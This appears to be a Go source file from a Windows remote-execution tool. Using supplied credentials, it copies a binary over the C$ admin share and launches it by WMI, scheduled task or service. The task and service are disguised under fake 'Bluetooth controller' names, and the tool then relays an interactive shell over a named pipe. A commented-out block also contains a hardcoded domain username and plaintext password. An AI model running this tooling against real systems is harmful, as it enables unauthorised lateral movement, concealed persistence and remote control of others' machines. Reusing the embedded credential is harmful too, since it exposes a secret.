package main

// kinit -J-D"java.security.krb5.conf=C:\Users\Joe\Documents\GitHub\goexec\krb5.conf" javanzato

import (
	"context"
	"fmt"
	"github.com/Microsoft/go-winio"
	"golang.org/x/term"
	"io"
	"log"
	"os"
	"regexp"
	"syscall"
	"time"
)

type Settings struct {
	UserImpersonated      syscall.Handle
	User                  string
	Password              string
	TargetShare           string
	NeedToDetachFromIPC   bool
	NeedToDetachFromAdmin bool
	Target                string
	Pipe                  string
}

func handlePipeSession(target, user, pass, domain, name, dropmethod string, runas bool) {
	// What is the approach?
	pipePath := ""
	random := getRandomString(12)
	if name == "" {
		name = random
	}
	pipePath = fmt.Sprintf(`\\%s\pipe\%s`, target, name)

	if target == "localhost" || target == "127.0.0.1" || target == "." {
		pipePath = fmt.Sprintf(`\\.\pipe\%s`, name)
	}
	settings := &Settings{
		User:        fmt.Sprintf("%s\\%s", domain, user),
		Password:    pass,
		TargetShare: "ADMIN$",
		Target:      target,
		Pipe:        name,
	}
	if !EstablishConnection(settings, "IPC$", true) {
		fmt.Printf("failed to establish connection to IPC$ share on %s", settings.Target)
		return
	}
	log.Printf("Successfully connected to IPC$ share on %s\n", target)
	defer EstablishConnection(settings, "IPC$", false)

	if !EstablishConnection(settings, "C$", true) {
		fmt.Printf("failed to establish connection to C$ share on %s", settings.Target)
		return
	}
	log.Printf("Successfully connected to C$ share on %s\n", target)
	defer EstablishConnection(settings, "C$", false)

	targetName := fmt.Sprintf(`Windows\Temp\%s.exe`, getRandomString(24))
	targetFile := fmt.Sprintf(`\\%s\C$\%s`, target, targetName)
	log.Printf("Copying gopipe to %s\n", targetFile)
	err := copyFile("", pipebin, targetFile)
	if err != nil {
		fmt.Printf("Failed to copy file: %v\n", err)
		return
	}

	// We can do a few things to start the named pipe binary on the target
	// 1. Start as hidden window via WMI
	// 2. Start as service (as user or SYSTEM)
	// 3. Start as scheduled task (as user or SYSTEM)
	if dropmethod == "wmi" {
		// Launch the named pipe binary using WMI
		// We will use the same WMI code as before, but we will pass the pipe name as an argument
		cmd := fmt.Sprintf("cmd.exe /k %s -name %s", targetFile, name)
		err := executeRemoteWMI(target, cmd, "C:\\Windows\\Temp", user, pass, domain)
		if err != nil {
			fmt.Println(err.Error())
			return
		}
	} else if dropmethod == "task" {
		err := createRemoteScheduledTask(target, name, user, pass, domain, "Bluetooth Controller for Samsung Devices", runas)
		if err != nil {
			fmt.Printf("Failed to create task: %v\n", err)
			return
		}
		fmt.Printf("Successfully created task %s at %s \n", name, target)
		cmd := fmt.Sprintf("%s -name %s", targetFile, name)
		err = runTask(target, name, user, pass, domain, cmd, runas, true)
		if err != nil {
			if err.Error() != "The service did not respond to the start or control request in a timely fashion." {
				fmt.Println(err.Error())
				return
			}
		}
		// TODO - Check actual task status here
	} else if dropmethod == "service" {
		err := CreateRemoteService(target, name, name, "Bluetooth controller for XAIE", "cmd.exe /c cmd.exe", user, pass, domain)
		if err != nil {
			fmt.Printf("Failed to create service: %v\n", err)
			return
		}
		fmt.Printf("Successfully created service %s at %s \n", name, target)
		cmd := fmt.Sprintf("%%COMSPEC%% /c %s -name %s", targetFile, name)
		err = executeRemoteService(target, cmd, user, pass, domain, name)
		if err != nil {
			if err.Error() != "The service did not respond to the start or control request in a timely fashion." {
				fmt.Println(err.Error())
			}
		}
	}

	// START User Data
	// Generate offline logon token and raise impersonation level - we then use this to connect to the named pipe
	// Convert strings to UTF16
	//domainUTF16, _ := syscall.UTF16PtrFromString("PYRAMID.LOCAL")
	/*	usernameUTF16, _ := syscall.UTF16PtrFromString("PYRAMID\\javanzato")
		passwordUTF16, _ := syscall.UTF16PtrFromString("VEXical911!!!")
		// https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw
		// Call LogonUser to get a token - Using NEW_CREDENTIALS for network access
		// If using LOGON_NEW_CREDENTIALS, MUST use WINNT50 provider
		var hToken syscall.Handle
		r, _, err := procLogonUserW.Call(
			uintptr(unsafe.Pointer(usernameUTF16)),
			0,
			uintptr(unsafe.Pointer(passwordUTF16)),
			uintptr(LOGON32_LOGON_NEW_CREDENTIALS),
			uintptr(LOGON32_PROVIDER_WINNT50),
			uintptr(unsafe.Pointer(&hToken)),
		)
		if r == 0 {
			fmt.Printf("LogonUser failed: %v\n", err)
			return
		}
		defer syscall.CloseHandle(hToken)

		// Duplicate the token with higher impersonation level (SecurityDelegation)
		var duplicatedToken syscall.Handle
		r, _, err = procDuplicateTokenEx.Call(
			uintptr(hToken),
			uintptr(TOKEN_DUPLICATE|TOKEN_QUERY|TOKEN_ASSIGN_PRIMARY|TOKEN_ADJUST_DEFAULT|TOKEN_ADJUST_SESSIONID),
			uintptr(0),
			uintptr(SecurityDelegation),
			uintptr(TokenPrimary),
			uintptr(unsafe.Pointer(&duplicatedToken)),
		)
		if r == 0 {
			fmt.Printf("DuplicateTokenEx failed: %v\n", err)
			return
		}
		defer syscall.CloseHandle(duplicatedToken)

		// Impersonate the duplicated token with higher privileges
		r, _, err = procImpersonateLoggedOn.Call(uintptr(duplicatedToken))
		if r == 0 {
			log.Printf("ImpersonateLoggedOnUser failed: %v\n", err)
			return
		}
		// Ensure we revert to self when done
		defer windows.RevertToSelf()*/
	// END User Data

	// Named Pipe Dialing
	log.Printf("Waiting for named pipe %s to be created\n", pipePath)
	time.Sleep(5 * time.Second)
	// At this point, we should assume pipe is running on target
	//timeout := 10 * time.Second
	log.Printf("Connecting to named pipe %s\n", pipePath)

	fmt.Printf("Connecting to %s...\n", pipePath)
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	conn, err := winio.DialPipeContext(ctx, pipePath)
	if err != nil {
		log.Fatalf("Failed to connect to named pipe: %v", err)
	}
	conn.Close()
	conn, err = winio.DialPipeContext(ctx, pipePath)
	if err != nil {
		log.Fatalf("Failed to connect to named pipe: %v", err)
	}
	defer conn.Close()
	log.Printf("Successfully Connected\n")
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		log.Printf("Failed to enter raw mode: %v\n", err)
		return
	}
	defer term.Restore(int(os.Stdin.Fd()), oldState)

	sendTerminalSize(conn)

	// Create a context that can be cancelled
	ctx, cancel = context.WithCancel(context.Background())
	defer cancel()

	go monitorTerminalSize(ctx, conn)

	// Input: read from stdin in larger chunks with immediate write
	go func() {
		defer cancel()
		buf := make([]byte, 1024)
		for {
			n, err := os.Stdin.Read(buf)
			if err != nil {
				return
			}
			if _, err := conn.Write(buf[:n]); err != nil {
				return
			}
			os.Stdin.Sync()
		}
	}()

	// Output: read from conn with minimal buffering and immediate write
	go func() {
		defer cancel()
		buf := make([]byte, 4096)
		for {
			n, err := conn.Read(buf)
			if err != nil {
				if err != io.EOF {
					fmt.Fprintf(os.Stderr, "read error: %v\n", err)
				}
				return
			}

			// Write bytes one at a time to force immediate display
			for i := 0; i < n; i++ {
				os.Stdout.Write(buf[i : i+1])
				// Explicitly flush after each byte
				os.Stdout.Sync()
			}
		}
	}()

	// Wait for either goroutine to finish
	<-ctx.Done()
}

var ansiEscape = regexp.MustCompile(`\x1b\[[0-9;]*[a-zA-Z]`)

func stripANSI(input []byte) []byte {
	return ansiEscape.ReplaceAll(input, nil)
}

// sendTerminalSize gets the current terminal size and sends the ANSI resize command
func sendTerminalSize(conn io.Writer) {
	width, height, err := term.GetSize(int(os.Stdin.Fd()))
	if err == nil && width > 0 && height > 0 {
		// Send terminal size using ANSI escape sequence
		sizeInfo := fmt.Sprintf("\x1b[8;%d;%dt", height, width)
		conn.Write([]byte(sizeInfo))

		// Also send as a human-readable command for servers that accept it
		sizeCmd := fmt.Sprintf("resize %dx%d\r", width, height)
		conn.Write([]byte(sizeCmd))
	}
}

// monitorTerminalSize periodically checks if the terminal size has changed
func monitorTerminalSize(ctx context.Context, conn io.Writer) {
	var lastWidth, lastHeight int
	ticker := time.NewTicker(250 * time.Millisecond) // Check 4 times per second
	defer ticker.Stop()

	// Get initial size
	lastWidth, lastHeight, _ = term.GetSize(int(os.Stdin.Fd()))

	for {
		select {
		case <-ticker.C:
			// Poll for terminal size changes
			width, height, err := term.GetSize(int(os.Stdin.Fd()))
			if err == nil && (width != lastWidth || height != lastHeight) && width > 0 && height > 0 {
				lastWidth, lastHeight = width, height
				sendTerminalSize(conn)
			}
		case <-ctx.Done():
			return
		}
	}
}
